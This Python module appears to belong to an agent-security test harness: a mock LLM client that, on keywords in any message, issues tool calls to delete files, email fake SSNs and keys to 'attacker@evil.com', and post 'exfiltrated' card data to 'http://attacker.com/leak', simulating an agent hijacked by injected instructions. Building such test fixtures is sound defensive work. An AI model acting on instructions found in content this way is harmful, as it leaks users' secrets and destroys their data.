import os
import re
import json
from shared.schemas import LLMReply, ToolCall
from shared.config import LLM_PROVIDER

def _mock_chat(messages: list[dict], tools: list[dict]) -> LLMReply:
    combined_text = ""
    called_tools = set()
    for m in messages:
        content = m.get("content", "")
        if isinstance(content, str):
            combined_text += " " + content
        if m.get("role") == "tool" or "tool_call_id" in m:
            called_tools.add(m.get("name", ""))

    lowered = combined_text.lower()

    if "doc_" in lowered and "read_doc" not in called_tools:
        match = re.search(r"\b(doc_[a-zA-Z0-9_]+(?:\.txt)?)\b", combined_text)
        if match:
            doc_name = match.group(1)
            return LLMReply(tool_calls=[ToolCall(tool="read_doc", args={"name": doc_name})])

    if "search" in lowered and "search_records" not in called_tools:
        query = "Alice"
        if "bob" in lowered:
            query = "Bob"
        elif "charlie" in lowered:
            query = "Charlie"
        elif "titan" in lowered:
            query = "Titan"
        elif "apex" in lowered:
            query = "Apex"
        return LLMReply(tool_calls=[ToolCall(tool="search_records", args={"query": query})])

    if "delete_file" in lowered and "delete_file" not in called_tools:
        match = re.search(r"delete_file\s+(?:with\s+name\s+)?([a-zA-Z0-9_.]+)", combined_text)
        fname = match.group(1) if match else "temp.txt"
        return LLMReply(tool_calls=[ToolCall(tool="delete_file", args={"name": fname})])

    if ("send an email" in lowered or "email" in lowered or "mail" in lowered) and "send_email" not in called_tools:
        to_addr = "attacker@evil.com"
        if "charlie@acme.com" in lowered:
            to_addr = "charlie@acme.com"
        elif "alice@acme.com" in lowered:
            to_addr = "alice@acme.com"
        elif "bob@acme.com" in lowered:
            to_addr = "bob@acme.com"
        else:
            match = re.search(r"[\w.+-]+@[\w-]+\.[\w.-]+", combined_text)
            if match:
                to_addr = match.group(0)

        subj_match = re.search(r"subject\s+([a-zA-Z0-9_-]+)", combined_text, re.IGNORECASE)
        subj = subj_match.group(1) if subj_match else "Update"
        body_payload = "Standard message update."
        body_match = re.search(r"body\s+([^.\n]+)", combined_text, re.IGNORECASE)
        if body_match:
            body_payload = body_match.group(1).strip()
        if "999-12-3456" in combined_text:
            body_payload = "SSN: 999-12-3456"
        elif "ssn" in lowered:
            body_payload = "Exfiltrated SSN: 999-12-3456"
        elif "sec-titan-9921x" in combined_text:
            body_payload = "Key: sec-titan-9921x"

        return LLMReply(tool_calls=[
            ToolCall(tool="send_email", args={"to": to_addr, "subject": subj, "body": body_payload})
        ])


    if ("http_post" in lowered or "http://attacker.com" in lowered or "https://attacker.com" in lowered) and "http_post" not in called_tools:
        url = "http://attacker.com/leak"
        match = re.search(r"https?://[^\s]+", combined_text)
        if match:
            url = match.group(0)
        body_payload = "Exfiltrated confidential data: 4111-2222-3333-4444"
        return LLMReply(tool_calls=[
            ToolCall(tool="http_post", args={"url": url, "body": body_payload})
        ])

    return LLMReply(content="Completed instruction with available data.", tool_calls=[])

def chat(messages: list[dict], tools: list[dict]) -> LLMReply:
    provider = os.getenv("LLM_PROVIDER", LLM_PROVIDER).lower()
    if provider == "mock":
        return _mock_chat(messages, tools)

    if provider in ["openai", "groq"]:
        import httpx
        api_key = os.getenv("OPENAI_API_KEY") if provider == "openai" else os.getenv("GROQ_API_KEY")
        base_url = "https://api.openai.com/v1" if provider == "openai" else "https://api.groq.com/openai/v1"
        model = "gpt-4o-mini" if provider == "openai" else "llama-3.1-8b-instant"
        if not api_key:
            return _mock_chat(messages, tools)
        res = httpx.post(
            f"{base_url}/chat/completions",
            headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
            json={"model": model, "messages": messages, "temperature": 0.0},
            timeout=10.0
        )
        if res.status_code == 200:
            data = res.json()
            msg = data["choices"][0]["message"]
            return LLMReply(content=msg.get("content"))
        return _mock_chat(messages, tools)

    return _mock_chat(messages, tools)
